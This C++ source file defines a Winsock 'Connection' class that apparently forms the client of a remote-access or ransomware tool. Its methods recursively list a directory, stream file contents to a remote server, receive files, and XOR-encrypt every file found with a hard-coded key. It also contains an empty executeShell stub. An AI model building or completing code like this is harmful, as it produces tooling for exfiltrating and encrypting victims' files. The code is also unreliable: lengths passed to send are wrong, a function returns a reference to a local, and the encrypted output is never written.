//
// Created by avita on 07/08/2020.
//

#include "Connection.h"


Connection::Connection(string ip, unsigned int port) {
    Connection::ip = ip;
    Connection::port = port;

    WSADATA wsadata;
    WORD ver = MAKEWORD(2, 2);
    int wResult = WSAStartup(ver, &wsadata);

    if (wResult != 0) {
        cerr << "Cant start Winsock" << endl;
        return;
    }

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        cerr << "Cant create socket" << WSAGetLastError << endl;
        WSACleanup();
        return;
    }
    sockaddr_in hint;
    hint.sin_family = AF_INET;
    hint.sin_port = htons(port);
    inet_pton(AF_INET, ip.c_str(), &hint.sin_addr);

    int connectionResult = connect(sock, (sockaddr *) &hint, sizeof(hint));

    if (connectionResult == INVALID_SOCKET) {
        cerr << "Cant connect to server" << WSAGetLastError << endl;
        closesocket(sock);
        WSACleanup();
        return;
    }
}

void Connection::sendMessage(string message) {
    send(sock, message.c_str(), message.size(), 0);
    return;
}


void Connection::sendFile(string path) {
    ifstream file{path, ifstream::binary};
    unique_ptr<vector<char>> buffer = make_unique<vector<char>>(BufferSize + 1, 0);

    while (!file.eof()) {
        file.read(buffer->data(), BufferSize);
        send(sock, buffer->data(), static_cast<int>(sizeof(file.gcount())), 0);
    }
    file.close();
    return;
}

void Connection::recvFile(string path) {
    ofstream file(path, fstream::binary);
    unique_ptr<vector<char>> buffer = make_unique<vector<char>>(BufferSize + 1, 0);
    int size;

    while (true) {
        size = recv(sock, buffer->data(), BufferSize, 0);
        if (!buffer->data() || size < 1024) {
            file.write(buffer->data(), size);
            file.flush();
            file.close();
            break;
        }
        file.write(buffer->data(), size);
    }
    return;
}

vector<filesystem::path> &Connection::getAllFiles(string path, vector<filesystem::path> files) {


    for (filesystem::directory_entry file : filesystem::recursive_directory_iterator(path)) {
        files.push_back(file.path());
    }
    return files;
}

string Connection::readFile(filesystem::path path) {
    ifstream file{path.string(), ifstream::binary};
    unique_ptr<vector<char>> buffer = make_unique<vector<char>>(BufferSize + 1, 0);

    while (!file.eof()) {
        file.read(buffer->data(), BufferSize);
        send(sock, buffer->data(), static_cast<int>(sizeof(file.gcount())), 0);
    }
    file.close();
    return buffer->data();
}

void Connection::writeToFile(string path, auto &data) {
    ofstream file{path, ofstream::binary};
    file.write(data, sizeof(data));
    file.flush();
    file.close();
    return;
}

string Connection::encryptData(string &data, string key) {

    if (key.size() < data.size()) {
        for (int i = 0; i < data.size(); i++) {
            key += key.at(i);
            if (key.size() == data.size()) {
                break;
            }
        }
    }
    string newData = "";
    for (int i = 0; i < data.size(); i++) {
        newData += char(int(data.at(i)) ^ int(key.at(i)));
    }
    return newData;
}

void Connection::encryptFiles(string path) {
    getAllFiles(path, *files);
    for (int i = 0; i < files->size(); i++) {
        encryptData(readFile(files->at(i)), "Test");
    }
}


void Connection::executeShell(string shell) {


}








